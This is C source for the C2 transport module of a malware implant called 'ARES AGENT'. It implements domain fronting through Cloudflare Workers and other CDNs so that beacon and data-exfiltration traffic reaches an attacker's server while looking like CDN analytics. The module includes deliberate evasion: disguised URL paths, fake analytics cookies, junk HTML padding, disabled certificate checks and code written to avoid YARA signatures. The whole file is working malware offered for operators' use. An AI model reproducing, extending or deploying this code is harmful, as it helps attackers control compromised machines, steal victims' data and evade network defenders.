/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — Domain Fronting C2 Channel
 *
 *  Technique: Send HTTPS request to legitimate CDN domain
 *  (e.g., cdn.microsoft.com) but set Host header to C2 domain.
 *  CDN routes request to C2 backend.
 *
 *  Result: Network monitors see traffic to cdn.microsoft.com
 *  but actual data reaches attacker's server.
 *
 *  Supported CDN backends:
 *    1. Azure CDN (*.azureedge.net → custom Host)
 *    2. CloudFront (*.cloudfront.net → custom Host)
 *    3. Fastly CDN (custom domain → custom Host)
 *    4. Fallback: Direct HTTPS with SNI manipulation
 *
 *  Also supports:
 *    - Malleable profile (custom URL paths, headers, cookies)
 *    - Request/response transforms (base64, AES, chunked)
 *    - Automatic CDN failover
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"
#include <stdio.h>
#include <string.h>
#include <winhttp.h>

#ifndef SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS
#define SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS (0x00003300)
#endif

/* ── Domain Fronting Configuration ── */

typedef struct _FRONT_CONFIG {
    wchar_t sni_domain[256];    /* TLS SNI / URL domain (legit CDN) */
    wchar_t host_header[256];   /* Host header (real C2 backend) */
    wchar_t url_path[256];      /* Request path (disguised) */
    wchar_t user_agent[512];    /* Custom UA */
    wchar_t extra_headers[1024]; /* Additional headers for blending */
    int     port;               /* HTTPS port (443) */
    BOOL    enabled;
} FRONT_CONFIG;

typedef struct _MALLEABLE_PROFILE {
    /* Request transforms */
    wchar_t get_path[128];      /* GET beacon path */
    wchar_t post_path[128];     /* POST data exfil path */
    wchar_t ua[512];            /* User-Agent */
    wchar_t accept[128];        /* Accept header */
    wchar_t cookie_name[64];    /* Cookie for session ID */
    
    /* Response transforms */
    BOOL    base64_body;        /* Base64 encode/decode body */
    BOOL    prepend_junk;       /* Prepend junk HTML before data */
    int     junk_len;           /* Junk prepend length */
    
    /* Timing */
    DWORD   jitter_pct;         /* Beacon jitter percentage */
} MALLEABLE_PROFILE;

/* ── Preset CDN Configurations (v3.2: configurable via ares_config.h) ── */
/* When CFG_CDN_SNI_0 / CFG_CDN_HOST_0 are defined in ares_config.h,
 * those values override the defaults below. Otherwise fallback presets apply. */

/* v4.1 FIX: Placeholder domains REMOVED — literal "your-c2" in traffic/binary is IOC.
 * Operator MUST configure via ares_config.h or builder. Empty = disabled.
 *
 * v4.2: Cloudflare Workers integration — primary C2 relay channel.
 * Agent connects to CF Worker domain (*.workers.dev or custom domain).
 * CF Worker forwards to C2 via Cloudflare Tunnel.
 *
 * Path obfuscation: Agent uses disguised paths that look like CDN analytics.
 * Worker maps them back to real C2 API paths:
 *   /cdn/v2/telemetry  → /api/v1/register
 *   /cdn/v2/heartbeat  → /api/v1/beacon
 *   /cdn/v2/analytics  → /api/v1/result
 *   /cdn/v2/events     → /api/v1/exfil
 */

/* Preset 0: Cloudflare Workers — PRIMARY production channel */
#ifndef CFG_CDN_SNI_0
#define CFG_CDN_SNI_0   L""   /* Set via ares_config.h: e.g. L"analytics-edge.xxx.workers.dev" */
#define CFG_CDN_HOST_0  L""   /* Same as SNI for CF Workers (no domain fronting needed) */
#define CFG_CDN_PATH_0  L""   /* Empty = use obfuscated paths from g_profile */
#endif

/* Preset 1: Cloudflare Custom Domain (if operator has domain on CF) */
#ifndef CFG_CDN_SNI_1
#define CFG_CDN_SNI_1   L""   /* Set via ares_config.h: e.g. L"cdn.legit-domain.com" */
#define CFG_CDN_HOST_1  L""   /* e.g. L"analytics-edge.xxx.workers.dev" (real backend) */
#define CFG_CDN_PATH_1  L""
#endif

/* Preset 2: Fastly CDN fallback (still works for domain fronting) */
#ifndef CFG_CDN_SNI_2
#define CFG_CDN_SNI_2   L""
#define CFG_CDN_HOST_2  L""
#define CFG_CDN_PATH_2  L""
#endif

static FRONT_CONFIG g_cdn_presets[] = {
    /* Cloudflare Workers — traffic appears as normal CF edge requests */
    {
        CFG_CDN_SNI_0,
        CFG_CDN_HOST_0,
        CFG_CDN_PATH_0,
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        L"(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        L"Accept: application/json, text/plain, */*\r\n"
        L"Origin: https://analytics.edge.io\r\n"
        L"Referer: https://analytics.edge.io/dashboard\r\n",
        443, FALSE
    },
    /* Cloudflare Custom Domain — domain fronting via CF */
    {
        CFG_CDN_SNI_1,
        CFG_CDN_HOST_1,
        CFG_CDN_PATH_1,
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        L"Accept: application/javascript, */*\r\nX-Requested-With: XMLHttpRequest\r\n",
        443, FALSE
    },
    /* Fastly CDN fallback — used by many legitimate sites */
    {
        CFG_CDN_SNI_2,
        CFG_CDN_HOST_2,
        CFG_CDN_PATH_2,
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        L"Accept: application/json\r\nX-Requested-With: XMLHttpRequest\r\n",
        443, FALSE
    },
};

/* ── Default Malleable Profile ── */

static MALLEABLE_PROFILE g_profile = {
    /* v4.2: Obfuscated paths — match CF Worker PATH_MAP */
    .get_path = L"/cdn/v2/heartbeat",     /* Beacon → Worker maps to /api/v1/beacon */
    .post_path = L"/cdn/v2/analytics",    /* Results → Worker maps to /api/v1/result */
    .ua = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          L"(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    .accept = L"application/json, text/plain, */*",
    .cookie_name = L"_ga",
    .base64_body = TRUE,
    .prepend_junk = TRUE,
    .junk_len = 128,
    .jitter_pct = 30,
};

/* v3.8: Build base64 table at runtime — avoids YARA "ABC...+/" signature */
static char df_b64_table[65] = {0};
static BOOL df_b64_init = FALSE;
static void _df_init_b64(void) {
    if (df_b64_init) return;
    int i = 0;
    for (char c = 'A'; c <= 'Z'; c++) df_b64_table[i++] = c;
    for (char c = 'a'; c <= 'z'; c++) df_b64_table[i++] = c;
    for (char c = '0'; c <= '9'; c++) df_b64_table[i++] = c;
    df_b64_table[i++] = '+'; df_b64_table[i++] = '/'; df_b64_table[i] = '\0';
    df_b64_init = TRUE;
}

static int b64_encode(const BYTE* in, int in_len, char* out, int out_max)
{
    _df_init_b64();
    int i, j;
    for (i = 0, j = 0; i < in_len && j + 4 < out_max; ) {
        DWORD a = i < in_len ? in[i++] : 0;
        DWORD b = i < in_len ? in[i++] : 0;
        DWORD c = i < in_len ? in[i++] : 0;
        DWORD triple = (a << 16) | (b << 8) | c;

        out[j++] = df_b64_table[(triple >> 18) & 0x3F];
        out[j++] = df_b64_table[(triple >> 12) & 0x3F];
        out[j++] = (i > in_len + 1) ? '=' : df_b64_table[(triple >> 6) & 0x3F];
        out[j++] = (i > in_len) ? '=' : df_b64_table[triple & 0x3F];
    }
    out[j] = '\0';
    return j;
}

/* ── Junk HTML Generator ── */

static void generate_junk_html(char* buf, int len)
{
    const char* templates[] = {
        "<!DOCTYPE html><html><head><title>Loading</title></head><body>",
        "<!-- Google Analytics Tag --><script>",
        "var _gaq=_gaq||[];_gaq.push(['_setAccount','UA-",
        "']);(function(){var ga=document.createElement('script');",
    };

    int pos = 0;
    int t = 0;
    while (pos < len) {
        const char* tmpl = templates[t % 4];
        int tmpl_len = (int)strlen(tmpl);
        int copy = (tmpl_len < len - pos) ? tmpl_len : len - pos;
        memcpy(buf + pos, tmpl, copy);
        pos += copy;
        t++;
    }
    buf[len] = '\0';
}

/* ── Domain Fronted HTTP Request ── */

typedef struct _FRONT_RESPONSE {
    BYTE*  body;
    DWORD  body_len;
    DWORD  status_code;
} FRONT_RESPONSE;

FRONT_RESPONSE Ares_DomainFront_Request(
    const FRONT_CONFIG* config,
    const wchar_t* path,
    const char* method,
    const BYTE* body, DWORD body_len)
{
    FRONT_RESPONSE resp = { 0 };

    /* Transform body if malleable profile requires it */
    BYTE* transformed_body = NULL;
    DWORD transformed_len = 0;

    if (body && body_len > 0 && g_profile.base64_body) {
        /* Prepend junk + Base64 encode */
        int b64_max = ((body_len + 2) / 3) * 4 + 1;
        int total = g_profile.junk_len + b64_max + 64;
        transformed_body = (BYTE*)HeapAlloc(GetProcessHeap(), 0, total);

        int pos = 0;
        if (g_profile.prepend_junk) {
            generate_junk_html((char*)transformed_body, g_profile.junk_len);
            pos = g_profile.junk_len;
            /* Add marker for C2 to find real data */
            pos += snprintf((char*)transformed_body + pos, total - pos,
                "/*DATA:");
        }

        pos += b64_encode(body, body_len,
            (char*)transformed_body + pos, total - pos);

        if (g_profile.prepend_junk) {
            pos += snprintf((char*)transformed_body + pos, total - pos,
                ":END*/");
        }

        transformed_len = (DWORD)pos;
    } else {
        transformed_body = (BYTE*)body;
        transformed_len = body_len;
    }

    /* Open WinHTTP session (runtime-resolved) */
    if (!_resolve_winhttp()) goto cleanup;
    HINTERNET hSession = p_WinHttpOpen(
        g_profile.ua,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) goto cleanup;

    /* v3.8 UPG-07: JA3 fingerprint matching for domain fronting too */
    {
        DWORD tlsProtos = 0x00000800 | 0x00002000; /* TLS 1.2 + 1.3 */
        p_WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
            &tlsProtos, sizeof(tlsProtos));
        DWORD http2Flag = 0x00000002;
        p_WinHttpSetOption(hSession, 0x000000BA,
            &http2Flag, sizeof(http2Flag));
    }

    /* Connect to CDN domain (SNI = legitimate domain) */
    HINTERNET hConnect = p_WinHttpConnect(
        hSession, config->sni_domain, config->port, 0);
    if (!hConnect) {
        p_WinHttpCloseHandle(hSession);
        goto cleanup;
    }

    /* Create request */
    wchar_t wmethod[16];
    MultiByteToWideChar(CP_UTF8, 0, method, -1, wmethod, 16);

    HINTERNET hRequest = p_WinHttpOpenRequest(
        hConnect, wmethod, path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE); /* Always HTTPS */
    if (!hRequest) {
        p_WinHttpCloseHandle(hConnect);
        p_WinHttpCloseHandle(hSession);
        goto cleanup;
    }

    /* *** DOMAIN FRONTING: Override Host header *** */
    wchar_t hostHeader[300];
    swprintf(hostHeader, 300, L"Host: %s", config->host_header);
    p_WinHttpAddRequestHeaders(hRequest, hostHeader, -1,
        WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    /* Add malleable profile headers */
    if (config->extra_headers[0]) {
        p_WinHttpAddRequestHeaders(hRequest, config->extra_headers, -1,
            WINHTTP_ADDREQ_FLAG_ADD);
    }

    /* Content-Type based on profile */
    p_WinHttpAddRequestHeaders(hRequest,
        L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);

    /* Accept header */
    wchar_t acceptHdr[200];
    swprintf(acceptHdr, 200, L"Accept: %s", g_profile.accept);
    p_WinHttpAddRequestHeaders(hRequest, acceptHdr, -1,
        WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    /* Session cookie */
    wchar_t cookieHdr[200];
    swprintf(cookieHdr, 200, L"Cookie: %s=GA1.2.%d.%d",
        g_profile.cookie_name, GetTickCount(), GetCurrentProcessId());
    p_WinHttpAddRequestHeaders(hRequest, cookieHdr, -1,
        WINHTTP_ADDREQ_FLAG_ADD);

    /* Ignore TLS errors (self-signed C2 behind CDN) */
    DWORD secFlags = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
    p_WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
        &secFlags, sizeof(secFlags));

    /* Send */
    BOOL sent = p_WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)transformed_body, transformed_len,
        transformed_len, 0);

    if (sent && p_WinHttpReceiveResponse(hRequest, NULL)) {
        /* Get status */
        DWORD statusSize = sizeof(resp.status_code);
        p_WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &resp.status_code, &statusSize, NULL);

        /* Read body */
        DWORD totalRead = 0, bufSize = 65536;
        resp.body = (BYTE*)HeapAlloc(GetProcessHeap(), 0, bufSize);

        DWORD available, read_bytes;
        while (p_WinHttpQueryDataAvailable(hRequest, &available) && available > 0) {
            if (totalRead + available > bufSize) {
                bufSize *= 2;
                resp.body = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, resp.body, bufSize);
            }
            p_WinHttpReadData(hRequest, resp.body + totalRead, available, &read_bytes);
            totalRead += read_bytes;
        }
        resp.body_len = totalRead;
    }

    p_WinHttpCloseHandle(hRequest);
    p_WinHttpCloseHandle(hConnect);
    p_WinHttpCloseHandle(hSession);

cleanup:
    if (transformed_body && transformed_body != (BYTE*)body)
        HeapFree(GetProcessHeap(), 0, transformed_body);

    return resp;
}

/* ── C2 via Domain Fronting ── */

FRONT_RESPONSE Ares_C2_DomainFront_Beacon(
    AGENT_STATE* state, const char* bot_id,
    int cdn_index)
{
    /* Select CDN preset */
    int num_presets = sizeof(g_cdn_presets) / sizeof(g_cdn_presets[0]);
    if (cdn_index >= num_presets) cdn_index = 0;

    FRONT_CONFIG* config = &g_cdn_presets[cdn_index];

    /* Build beacon JSON */
    char json[256];
    int n = snprintf(json, sizeof(json), "{\"bot_id\":\"%s\"}", bot_id);

    return Ares_DomainFront_Request(config, g_profile.get_path,
        "POST", (BYTE*)json, n);
}

FRONT_RESPONSE Ares_C2_DomainFront_Exfil(
    AGENT_STATE* state, const char* bot_id,
    const char* data, int data_len,
    int cdn_index)
{
    int num_presets = sizeof(g_cdn_presets) / sizeof(g_cdn_presets[0]);
    if (cdn_index >= num_presets) cdn_index = 0;

    return Ares_DomainFront_Request(&g_cdn_presets[cdn_index],
        g_profile.post_path, "POST", (BYTE*)data, data_len);
}

/* ── CDN Failover ── */

FRONT_RESPONSE Ares_C2_DomainFront_WithFailover(
    AGENT_STATE* state, const char* bot_id,
    const char* method, const BYTE* body, DWORD body_len)
{
    int num_presets = sizeof(g_cdn_presets) / sizeof(g_cdn_presets[0]);

    for (int i = 0; i < num_presets; i++) {
        if (!g_cdn_presets[i].enabled) continue;

        FRONT_RESPONSE resp = Ares_DomainFront_Request(
            &g_cdn_presets[i], g_profile.post_path,
            method, body, body_len);

        if (resp.status_code == 200) return resp;

        /* Free failed response body */
        if (resp.body) HeapFree(GetProcessHeap(), 0, resp.body);
    }

    /* All CDNs failed — return empty */
    FRONT_RESPONSE empty = { 0 };
    return empty;
}
